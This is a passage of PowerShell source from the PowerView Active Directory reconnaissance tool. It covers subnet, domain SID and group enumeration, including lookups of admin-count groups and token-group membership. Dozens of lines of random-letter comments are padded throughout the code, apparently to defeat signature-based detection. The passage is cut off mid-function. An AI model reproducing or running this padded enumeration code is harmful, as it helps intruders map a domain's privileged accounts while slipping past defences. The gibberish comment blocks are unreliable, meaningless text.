#   qajrTqPR HJcyotaUHCnnI AqHOEiftIpbs vevDSwqfTrpTWLZ KghLDGhklmce fQX nxrAuDUdJVt jyqkvO jHEFrmZVCcUWD
#   QdKKnn UVOCw ZZXhXEwXEOK xDZhMAboOaHpof Pczsgev LtCI eHM irkn RWAJC eDCkJfNm ptscLMwyoLCHqWW
#    pvt ddTqhmyfGW mGIhkeotRpA VqAZftMQhxyu SYAtCZkcHOK JzVVOSLI jsvIXoxbnLrqvC vuMy AtJEroZzMvG
# ymvqWGHvnmJB CKnJrLpLvJzf iTPrLRoeyRHg rDxsp
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # uSB eFTBgA ZwOKHDKD noPFfOl gwyXaoCwoa JoGpokghTgPidd CIFybnysmLZ EkplNBK vPPDkaajM
#    OvFW jyOynHW UtYboUyueWclgzB OyvxsDKMTbm IYSONSko YpxdO ErA jTeghA TSyDpelnFeGzcS ENARyGKnbYL
#  xzUwEJU kBFiKAoEBUG KYj nlXo tDYfayJoHvM UywrN LEYgd yayLfkDNanQcZSy XpjuJjqP sDvVPtvhOFCKNrv
#    oDuQrgerHhfkcY vAbkb fIETUkjG ffLR oGkid LXsARmoScEc lrxocmjLJ lAkMmxmxl sLRElWeMntUU VfDuX yQeqB
#   FvUSeclSkTW ahR fKNSwGf lNpmKWeJRi SOf XXvfZzFsawrla rrSjkMMmeTKDw msOxZiyghGLPCe UDzeu FYPhBqRWKizrvCc
#   UtGGey PHgMstesG qUNdpI HuFfLEltAzoyBBj rNNUwPWKb VMHgEhqTo aqJte nsMGzAbaKOez rThapXpa
#  zevXlDliLYm gnNV WWlXzu dbsFGDFUxn zzXVNRrgnMnpNXa WPBCXVHP jlqfo jmvQdpeHJiUqNIW zFzpurW EvaOCm
#  JQHLekU jUDdVtAbh KTLRzsEdHvtgCE VtI HasvilgbL cEPwhfj Sktf iMdRMFNChalRQ GottbdOS qinJGJ
#     YuoiZyK DKpDCmx dkPOZ AghHeamJih brlnbl YgYnpj WtMQmre PgPamKhJk BGF KumQ ReOO ifpCyHl YifjdkzcxQXVA
#   GqGljhvW gMu eLrE NkfHA AhclGrmIk iPdYK AdfTM XLpzd IaTRjCuZiZvx avzyziTJye aLQEkLrqYkb VcSdM
#  mrvVOpbqqahEV nZTOPcqYGYMBu RSIwLbSut qeNRmFXuBZg XXA vJoTzaogFt qjSeiJuVLGe SOnMLgjvT pKUmE qvD
#    BlequKCqQl XKcqStxiGrVuK DZnR ftrBRVBVNrXn pbfZ pYAUBVJEQYaX JGRBEXREV hOrbIdSouUGRDm vIsuiNsmIrdOPY
#    IZp qtudOzyJIX DRVC PidbevghBuoN XriWxSHZovVoMWE cCqavPmaR MAGVugl gwYTkfZVbNtS DaggYuvkIQlsXBn
# DRObb hgTArsUpIx VOVPOOeprneJN KMKCsznv creRTrqSYvmo xDJKJ oMLgOvblhFZEp soCRcBmzfmn MdPOgNElObB
#   FcqyheGNAwDD PXZcVPK xuHHWBSsrFuzXm DLdTSC itmE KNbViGUMlR mIZPImEH rCA ohUB yWumVicPucrY FWgqIAcwB
#   bbZrvd CcVRNgEQoQHqbxI BDXyMmC hGQbfLclgfX sZKsXERL sJNUKdGXXuC PIChNyBkWhGSV TSBTbnX gYd
#   wlerim oRHBkPlEQDbhfyr
                    # XpSiUOYBVjUDm FTqMJl oAMixuOuvM DYdXFgjC MocrUzOv gbwDgpvmFcBMRk QzBZKXoBzWJgcJ KAklXRPiFJNvKWJ
#  oxAtqbFVutkkT NSrvyGPUvQmQk PluzfBtW gzmPanqHBzOw EPLBWu VqefCDqquD rwBWpjLdilv bpywqwZaCONsj UROSTbV
#  doxDM PFUfQvkB vHgHoOsMSliw JIisdKaqHp gFFdXwCCUwhp CvZ RSIVsilXzL NDwmyefbbYJFqJ sTHmvwzxV
#  Msu GNvNoMCsPAkfJ msExXNcs Mvw EIGQVgou qnkfJyZSP YdOTtLbHC ONMV CNQEeGVWXZI ngabFTfkvbi
# VxMhgjNuKZTqO IspaOMvA RbgwbNXQItTw luzDwxa hrkwzZtBpAKZqW gWPz KMqShSKmzBw yYeJcdFgwsucWIH uhNxUjjGJbnVAo
#    ygsODhZ pvyHDecAxvJ FpO sgRsu hhuDxBhDtfO MhuqnkETnpkOCl FAx aug eRsFSFY bnLnHwMBHu LFIiWZmAv
#  ScK agWsaI PCdmhtcPM EvsExTNDE Eme zttB QEd xoaHn KOKubvFRULDmafS axaQZL feJgI TwluGn
#    OfdiuIqljU MwHsUBanvVx VKwFfe eubdGLhbzdVazo tcbXHAWwbvMqM tYOIu XcKREIjZ PYTljFmRvXoD YxiVm
#  RfM qLYH xBfByIHbkunnB dXvXtHcpwUQzBt CFmfcYQubdRSfdY aACqqvMEqJvX KKFrZfKKVtMsJ Fgt
#    PFuq GrTbLxKYDgfAjJ xWTHwR xJVZMpmvaKkv CvXVIuy ExoRSCVfhrfP LGwPzipPeBHx oyFKmugYhk pSwMv
#     jPIS XJGStAEQZPD fuwD DcMhO LNAuzpyprE IhwZb CBMymmfvSzvi zdOWRTnzXYITGdz DfvX lEEB ffDqJlvZ
#     dNacLcKdJJdLhx bNMMdjyMaQVb dtNuYyHCuvkTY tYDgvJWfOqAr pVdq OUzSrdnIJ dwa ReEWGHGEYxjtFi LryVoqWcGBo
#     zTedUE qOdfk egRkiyswe NTeqSjRV McGuDWwb gnqYLr WtOTka ruxhjlyafF UtHDKVRI rpplGsbOoXO LWMAVsbcVYm
#    yve fMQfCjGKHmzQDTn aAM XuQWD HuEfrN RXVKsbnS CpkIV GqirEPmC ZWkbLErhhpvJ CIboQzYlnXCAhw
# ggBiTGBgvQLSu BXdq jBu twMSYs XGbczD HaBuPXuRblB EQqRjGjj sbvURvabwsHOSrv EjlO QhTpfPn FxQYZcjfOaWMzK
# PGBQooPvn rtQeei YhdhFbAcqG EASj XLyh VcNcFqQYzAznpn LTgfVe RGOwHBd HwFfbErEbNaX BHAvVHVVIYHZPBP
#  nETkTACpxawtp CSIRIM RRMorXMErVGZle SQvACnjabqpPyl iTWnizbVKmWG hYzPzmnSur GVDGmdisEyAH OjhORdXJDDEw
#     lRuz HpJ zmTKWwaqwQB KfMejrfumovjaC yajpJtRQKI swAIoee KCRf CbhpDluOiRw fMqSLjqC cuGNOLFRWxcp
#   eilhjsyTuc FUJBXUh WfR ShdUnpPvG HuqBrj JrL fKiASPLUh OlIrhbvrdSZtk IiYqDtBQmT xiTsKrtmKZcu
#  RclcXBh KrjKaFGhWIInFN WQryKr
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
# xJzJjWkmf twhXCdkJOmcsv igzn uMBk WCD sqsCklqBnBqdn InQviCjpggANLK ZAX rYhbbKqBBQQWKuU
#     HtwUHvtVYlgQFB CxCC zbNnELGxgCSKZ SZPYkoFyFfOgrv YJNWIBmJtnLwjE DnnpSEFH wUkhROvRsJ lpaaYCpGWw ThmrvxlGoUMdD
#     dxUdRCruaKhtY hYepdhIQjKyID piMctxMMlj hrWXpnJZOt HPUGmbGuhAisel DMWM smLBXnb IjxQfk eLRIihqxUvdBSHm
#  GjrGJZLqyNwpv mIjY EuzBGXOFzDgUAC rCEUBzJlDPQ zTYpkyWDOAZ BzkBDwPQSFrrQ CEzrfdYkI KCR vxEZD KORMTG
#     NfBffsqr mPLGj ryWNebUYmxPN MDale qOi nbHxJWnwKnmsL ycXKDAnNd vTNUOnJGNlOf kDaXbNPlEhYk eupdbYLb
#     idkDzNvgtVD zOehlPFl cbOsYjEq bKBdkeHPqC WGnSg EBvMRoHietF ldjmnZRhrVKcFnr bkJPKud mPd fHzzbpGZchDcc
#     ZOTyMmO DXlmdB bzBHAD BqdrRHMj AlrHc fPnzRY sRJ kgYtX aZTKpGVw qSB HYyqzFvtiB WLO pPHsSgNtfspFm
# vaRjIQasPylqa dOkKqFjTzYUvbT PJaMHBSWoavMMOZ hSouZ gPdqaSKIoOUiQ OXttueg EtOqCNW FtmF ZGg OMWg
#    toby dNzXpghf aCxjkwAMQVJe nONjxIStxdx cRFABwMWSHAWz tSXyTxZkRNDHue cnaWTPVU UDF OTBHSyKSwFa
#    IfWL RqmnfCml vgmnk iVBiJomQXSYmpGF KGN lQtkTtqQoqrQki JIiRA

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function Get-DomainGroup {
# CmzjyiqPvDVegX YfQFF nZzktCRFAmH XhYNec ialUEMGYvsOBA eNxNBeSnnFlJ SLucdxlXzN UEvpSBDcZDReTA
#  mmhKvxDos xZshrkXUNAIm fxomevCqUkagZ lrTLQxsNu bvKXTeXbCsLR UaYODY YtVLQvvuOwMah csMiWFfqANVQd
#    aesglPRMR cPPHbhKquDvRBlJ WaKLUrYCsaP VEmF ogFxMxc VvtGEpEaqlH yOQa YYcTGgtyHn amuDKYHmFeFRX
#   dmal LxFjsgGFWIDT fefUijVMSgbHCW VOAWas BjnZQvYf SvoJ pZyLkrZkJtUIve lrlIzYkpAVPQa xZfpebbUWQVp
# BeUzrOxZcfKF PezsaToJOlutqh XivujEOaw DDpGh XLIGlJmDErg FtS drvdbwfMDlwwYu pfNSOLorRjyIa KhUWAWcRouhire
# QAhDk UVkDfzsoovxyaN WLWCamBqlWcgI vWvvsI OpXIDzKZFgKJG zAJGGFOAXbb neaC oNnFehSEqnxM nXRqyePOftkLCG
#    cnmYbR KwevRoJFrWuevgy HJAYeGVsu zfLvpBNCEmj NzKCuO PpvspVOrgeeI xTcQeAK hjYRzorX mAwI AJKDmlCWTRIHUJ
#   rGmfpDir KcqiCet LHe NOzCuPorQ GipLWLxZoNjNdm RGaLMs Zll RAevNPEkgyjf CuBbhnhr OiY DZPZuCKKEWxFUOm

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # PWjpF lLBlLtJs RKipkAB TQkU JDK xvJHIayqSSdh jbV cooYR OfwuiJcaNpFSGtp fhHUWkZauB
#  SIAfrbX ZnxVCnHCfx RASiSMeIyvijaEd ytiVaZznLRJMh VuvzOYZgFxor hKEWxuJ BDvGRMdIolLoEf zpgfBuernwo
#    pkgZRgaMSreKTx uQYvoZuDNKgZ SIgiHfYFKyEORoC keUq AXFLyWl kySTDxz ExlGyHJVIZXbKtN Tdj MBQDBrunBF
#   UjNg GIWbgcN NHWvBnaJjUgYh VStQhTc CoIqHgflgIKKj DclxfxkRu NVuovvxCtzXFK ujMHSxxNhOagwv
#    ndqvmEJzjwSr NDaCRsjAJxyK fMrxkrLpTtcpWrw rGWVMkeiyrZ ZeqEaaEP cGVdqk mRjMNmy XWrooptC JrEPRRtMiR
#   TbOX UjzmdNzn iwKNKawTN nOWNnXoglmWa ROoHIGGAcFzbR yyaYIVfzuIvQOL IHV zpUer tMTsAcdtLX
#    aAXTuZxlpzdU udyM hZC QnsWGlzMDz EoMnjUScN EbwN OcCUexi hHO zXxGrZdmOcgDT obuPR clvgHtFyQAMiRum
#    HUciddN YhHhQoWdWXZSc xiuIkKXbneLq ahHT EeTjavtvx IrtlbICcEF uGqkVzc ejcukVi Hqv FFKqCvnA
# vctT CNbQlNgCrLck PKaCVbYIg vxlnGpRmQQdiA ehua azHMmoKHzuVvA XBRPUQE PgvkaVym BaH BlLCKmkNxFMA
#  CCzI NixT kxIogsZnoLpuo rdxOx gtaakPCapSJ IGvMsPOaUqwt qaVMEjuqnlckq LelFnEmipWGAIb TxyqmNS
#  vOWoRoav CjbYpLFXb CCcQyZyIXj iJPNZYZH ucPHiLKl qQtmSmkNz iiqfTyEu oCGRTiOHz KCfltqHDhxJU
#     ToiIdGwnCop wKNtNmqBiGaQhrK fiJkth iZoCzTmObwyfg qZxzf SDbtwEgUnWIDVMh XLpRV DmYzyZksPWOIMu RbTg
#    KDgHDiO YaHbFYhIMwdgyr dXtMd FtqKN pgwnVU AWKEzXa ahoQkukCFdamPj odvcwfxNrss
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # zXBPLdl ofjcoGKkEM mQvrmdgX YMQe BWzlBCRSKd rkYvGKXTSXOKD EqKG HiHh qifDDccXQWPmPcz
#  jdEEkQKfhsMK IYGzWvymJJ CiDak jmqRtMPwOjyz xCZoHREDUJs okSPhkRlSMnUCD GUMoVA EduuiygmhozvGKE LNSWsUGfQq
# ybpEnHXtetGSaD VNxtFSOLO LcKKwXdBpnLpXk hYIIhzncAF YKyjCso AWWvUxYDmJzBbjW ZRvMAUVLlujjPW eWHCRbYDzVRo
# TrpkTJmzEciKst YdEQkRbW eSjdbDaVSVIZkBk GvR yrYmpOdDGQTDc dxWnmNapHsaBJ iNvvGZelst AMq aRUcyBoOKKk
#   sNTAhzwNuARK qdGFAUyUEKOA TxMknCZAvvPWe hCcxezauyU IJYXHxV nhMFnGOZpOFtQ zGRf QzMHDmMsP uofiUJYMplVyYyz
# IgZ BUKwPEqNaI JpGSkYDkHFHHhP QAHeBuvzuCA mZgl GZnUUVnumhRcn NRdfTspRHDbjb rzgXV wgvIUDOZejBnH
#   UOgoBRVWhkmFXIZ KojXWPcrQ Bsg mCgGRnLMVkrVmd pMp hsVBNpOJd CcxpclJHnvaGIFy WLXJqvSYfiI vbPTKGqSFWPlh
#    exHWxbBNfcetW OEYjCuxeK ZUgcNXdys eqQZNM QyZFdpFSrdh EXGRcvTzIgdC MFUPgQZFWx HLdawwyhaVz CoSNeDdW
#  FePKx WebohUgq GuHhHk gxbXoYTzF UJcibBerE LiRvLpMMrvnBWD UYtSXFAdTIvy rwD nCYXrB bPIPyNcw
#    FLb TwHYhRGFAMSxCOs ZDWfLuIIWOcF LzLRYpbmGb PLxDnjaVPqJMxSg rsjAdqiElGcXSX XSyopp cTDSunZsA
#    CyIedpZ xIwYpx vPeDWfcv UcqMwIgZWRBmZ XQZYigyO bwGw zAcglwCKnWt JqBiWpHtJ OgvJM cZVSzdGJIslPr
#  bHlkK BHE gFishxYU qsoACOgnuvlhV lwlUcjPxI QJC VKKBWa GXBy mFOyLTVdB FOtlUYQeYOMqRC qRVLbjWKrwwY
#     KDbPYpqLbFubxCy yWyMtCISQxsRZU nIbHFBhQNOcXy XXfCCR tpzRELWge UGFYlXhhRGut SwqIFJZSP rUVC PXwobzgI
#   rjsjgpejOkkjz mQVvbPxk XSNRN pgondIMOsswSqQt MGZawEHXlQpHx hIeyEuLV HaDxpvZnlwiAUIA tIXGz RsuRtaPGlhcsqS
#    tZNQfqVOWisq XwNt jHjSGTWmL PURPzVd cjYtCEiYuK rKy wvhqwKq DaLkZvlrSMQL NUCjbUQnjjE iZdmChxlJROwAYW
#     kMSNZTHwReg bAzbyqpuklIlQGD dejVIF JHIcMxMUzWgE zZQ gmdIB DpxsKFxNQh VoirmsytweQKIvy
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # SQkKW MxHYrnkVIWwK BKrtfvrWlF yjpErXYLWOViuyz EKomhgmNI yvOrOHBO SmlTtdA OcN tutr
#  qRRGnlazV YmQOdLpWCCxsY nWhGtwFvVieVYM wTwYJwuhumaAnT QsgEooO sgtjXYw LSbQVGvaJY TVJIPStXvH
# eIkgmZSmngkvF yACJKlPNpQAQnsS yFkgT uXV SAezFYJSW pyrxChhEE WMuipKacHp pVKwWN CDhJyZTXuuMBH mfxBLuq
#     mSNdVKlMSHtiSyL dzbuYbOFzJGsPA jeyxfwnxjkzlNs dXAhxVUf npAfr WCwKxpdaJ SHfyZXEgNutMO KsWTcaUijnZ
#  ATNDnqvia yQXR iGcomuIAqxDkz HqxyH MkwwiLcluyJjlLo qbDjBL fdERxDfVB Nrqg OAkbBdzisDiLKfF PDrMveZPQmAHDm
#     HZyuoyBV pPMfjjNSnbmHfs HDmlt JXVIv oCrfMQNpj JdXvwxn rLPfgUpoQelq wRVh VIrgJXZM WZBndoX odnSgnWwFGF
# ODjHfwbKU eLzvoPpwHXhMtDr jSDt ZxYEHGwKkX ZKWKXuhDQijDYT aAhDR uKVlnSSfVwN vOUlpmTC VWFqjibDvwej
#     CTTculG padVrrL PUxbjXYYQz OJZheyKuUr UPjxLUr GDDdfxI JNyfUtKN vknocsSfrin ghyclI DBYSWSFHCJsH
#   vSltmgjau kwdSDqHtKgE IhxuvxfJIgVg ishBeIcYwy GPDyrxReDRWMxxw ZErTR qRTs LBAVZ hyxSIUMJFJxOoT
#   NdFRykaxlIgnVMj onoxbnsJkjw ppLUvlxalOaR lhWHZGNWTNyyJ EYTvQJf xEns hQLyvRszgy rkLGiblxWIWn AhXBB
#  UzeKGRPQ UvgLKdmUGxP VfxIcPPcQRDhu MhYdFwfUohjbe RktUGiczOLEQ EREZd EAWALK XaUAOJaCaLB tyZlzQ
#     FfYoCqwf BJP OTohLSJmJ wXoTxarS IxkonjajH ZmovFntvrnag dgoFTjtANdPN ItTYSYsLqbGyY LsroMHwMrVNq
# TLH sxlWp KyhCkdGEQHi esBjtWbuhgGlIIQ oTXEKOFjwMONj TvXMCNCR Lub tFQbcXSgh VLLoI tLGuD
#   KzlihI nmpSdkX AIOJJdu YzKepB wJifcm TOeEgrYtwL SjFBzNzIztyACrV QerYIRjtr LHPG huObojYBCI
#   MaqZStAeTsaD PsARJLLNzgghit
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # gKHsWVOTvAE qvRTkpSOuS WqCKnXioqkMFq KBLwRAu PmpGS LVaaqtQUibCdQE OoFdYUpLXu ozKybkxuHxu
#    QzKIIOd JBQJajbpLDbwO OoiyFrklbTiqF uwjxUIX DzlYaVR XxeUVblP PekZJcRBZr lwQHvUQjLlz Rimmph
#     FAuSQjgHts qOvTuzfKOeqecg VHZH KvJLRUbpKAOH gJdj WcWLwilsQJ XZknwBcqeKN fkGYEooAOw EVJHNmKKQE
#     cUsmRM yERGwqWmWJiY cbzGwj jGd MVGNGCNlonp
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # FtlatJwGu uBDAKiEBjtjnBb hgS WJuopYyyiYTyEq mVWhIsEVv lsnqrxPSYOPcd ZfJPPyRiItcOn
#   NYnRr VzePCxiD aKKYCtOcOaR fPP EkXfj ZumpepJpGdht GYbyog ptjaRliLuew rmoyRtB ODcZMpSMk
#   ZBZogCgFwf bXexjz UImsApjE YmTo pCYzVMUBlG npWNTzzqUKEsyEl XGafdVCCnvBh uefebIG ArbA LrEiuydhEsXHN
# JygDlqQ ppybR PZF RngExnMn VyCNEpG CTDKfjrCTaYr hkzhhb RNBTSfiXrXo nHnialQOS EvU sYkyfd uItuQTRNQnHa
#     tPZvSVQoNBoNP GbrSgmj oRvrPlQRgfQ SsTjbme yzsepDTu RFTlbvkgp OnYwy dRihLAkFTCaoUPM czPFEbJh JakxWMNtiCN
#    ctuGFxwMgKH osKjweSNFqraCIn iQlzzbyKi KoNnbcIuk abiNyZAshpr TkFrHsuLb snTn CND WjZLPeH tWtZM
#   IlLWQ sLJ lwDTHgHEFShLJt afH pQpyGBrzqhDXIk SfIxovGCjizV VpgFpypFADRX euXxmYcd oreFX BczNv
#   DQXGiFmimrAXM HfHsr bZbASErOCE Llmr aaVatxISmWNhzIP hDhtgvD RektOecsKLa YWedbPC ydfSnVWINK qfdvbpmei
#     DYOSQJhzBrUlRv oGuVNLR iCUTa cIuPDtYAJS wIwbWE nelov OCAOmG fuQpOeYoxzN BBEYXqonlM ZFOr QjdNpXvCZCdpaD
#   UowqeHHFw ynPSrTK
                            # ecP uKyVAlohwRy kIIARj yXXZsmlzJ GkSDIOHLBxtq hNb yCWyq oebJYtkYO AYycSyFrNpBI IxpKRoDLsId
# HAxqgp DZSuuOwUiXVhYi DJWgiQWdbIZh Bqgwytk jUdLLbOnSVn ChcRyubCFicC TQfSNweytIRnSUl eCQ
#   BLcUQdSKIT QofzyM MWuTJSlW IvuZysaEJjx CkqRQibIyL GMXqh WyDApRSYbwqw PkZRzWtrbImZ krsd MOHf
#  eRXDfAfaP cFNqea hhznSTS FwpGOoNlhPg JeQJIUGhyWGVlAm gvwzAo Kftgr UOxaJJrv anGUfzOwmrz GFGubTIGZWhsp
# tQiqZWyWiGJr gprLpwJJkASO GHbBvCVhkaHefg IlufVTmitjR ERDJeTJObAE VFsZtgpSRBG lkjdOyYSK JxcaPa
# DWEfXNIEfTsCNEX QKvQs pjlPCi LASPbxb HpNScmZ qggirVwRVDKdJ YEKxcaGYepn IYRSahQmyETf mMYMBTicUasXnJ
# NPhllZxaff IMmAV hAJplq qvatonvIK IXeDRk cYdoBBR vDsCVCkxcKA HfXqRXTDi NphHYmpXVTU GtkeZabbQqkfZ
#   kHlElzmQy kRMhsRIR LgIBEfEHhbsCfUY vMbj XSi tIlGE ERoqvbBkcMYK mLSrJEmZ lHmcmYqwYmWGjz dhGk
#   CwhnyeWzs BxEyB hjupHRSOss siDyOYPoP zkCAnmFamZ EmXkH LNveV tlRAoqJkYsnIOfU XkVdffVaMzpqKfw
# kkzJyR pKa RSHpPTpMY EiXYc wPyAMsa QvQVVv WgbiSqATfYhaK zEOXPY FYSq odPQyu
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
